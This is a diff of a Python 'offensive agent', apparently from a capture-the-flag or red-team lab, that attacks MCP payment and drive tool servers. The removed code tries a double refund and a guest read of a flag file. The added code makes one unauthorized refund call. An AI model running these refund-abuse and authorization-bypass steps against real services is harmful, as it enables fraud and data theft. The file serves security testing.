@@ -1,81 +1,49 @@
-
-
 from finbot.agents_mcp.base_mcp_agent import BaseMCPAgent
 
 
 class MCPOffensiveAgent(BaseMCPAgent):
-    def __init__(self, mcp_host, telemetry=None):
-        super().__init__(mcp_host, "OffensiveAgent", telemetry)
+    """
+    Offensive agent responsible for exploiting high-risk MCP tools.
 
-    async def run(self, recon_results):
-        results = {}
+    This agent executes active attacks against permitted MCP servers to 
+    demonstrate vulnerabilities like unauthorized refunds or data exfiltration.
+    """
 
-        for server, data in recon_results.items():
-            results[server] = {"attacks": [], "exploits": []}
+    def __init__(self, telemetry=None):
+        super().__init__("OffensiveAgent", telemetry)
+        
+        # Define the broad scope required for cross-server exploitation
+        self.required_mcp_servers = ["payments", "drive"]
 
-            # ---- PAYMENTS ----
-            if "refund_payment" in data["high_risk_tools"]:
-                attack = await self._attack_double_refund(server)
-                results[server]["attacks"].append(attack)
+    async def run(self):
+        """
+        Executes an attack sequence against configured MCP servers.
+        Currently focuses on unauthorized refund attempts on the payments server.
+        """
+        if not self.mcp:
+            raise RuntimeError("MCP client not initialized for OffensiveAgent")
 
-                if self.telemetry:
-                    self.telemetry.record_attack(
-                        agent_name=self.name,
-                        server=server,
-                        attack_name="double_refund",
-                        success=attack["success"],
-                        evidence=attack["evidence"]
-                    )
+        try:
+            # Attempt an unauthorized refund exploit
+            result = await self.mcp.call_tool(
+                server_name="payments",
+                tool_name="refund_payment",
+                args={"payment_id": "test-payment"},
+            )
 
-                if attack["success"]:
-                    results[server]["exploits"].append("double_refund")
+            text = self._extract_text(result)
+            success = self._is_success(text)
 
-            # ---- DRIVE (BOLA) ----
-            if "read_file" in data["high_risk_tools"]:
-                attack = await self._attack_bola_read(server)
-                results[server]["attacks"].append(attack)
+        except Exception as e:
+            # Capture the error as evidence of a blocked attack
+            text = str(e)
+            success = False
 
-                if self.telemetry:
-                    self.telemetry.record_attack(
-                        agent_name=self.name,
-                        server=server,
-                        attack_name="bola_read",
-                        success=attack["success"],
-                        evidence=attack["evidence"]
-                    )
-
-                if attack["success"]:
-                    results[server]["exploits"].append("bola_read")
-
-        return results
-
-    async def _attack_double_refund(self, server):
-        create = await self.call_tool(server, "create_payment", {"amount": 100})
-        pid = self._extract_uuid(self._extract_text(create))
-
-        r1 = await self.call_tool(server, "refund_payment", {"payment_id": pid})
-        r2 = await self.call_tool(server, "refund_payment", {"payment_id": pid})
-
-        t1 = self._extract_text(r1)
-        t2 = self._extract_text(r2)
-
-        return {
-            "attack": "double_refund",
-            "success": self._is_success(t1) and self._is_success(t2),
-            "evidence": [t1, t2]
-        }
-
-    async def _attack_bola_read(self, server):
-        res = await self.call_tool(
-            server,
-            "read_file",
-            {"user_id": "guest", "filename": "secret.txt"}
-        )
-
-        text = self._extract_text(res)
-
-        return {
-            "attack": "bola_read",
-            "success": self._is_success(text) and "CTF{" in text,
-            "evidence": text
-        }
+        if self.telemetry:
+            self.telemetry.record_attack(
+                agent_name=self.name,
+                server="payments",
+                attack_name="unauthorized_refund",
+                success=success,
+                evidence=text,
+            )
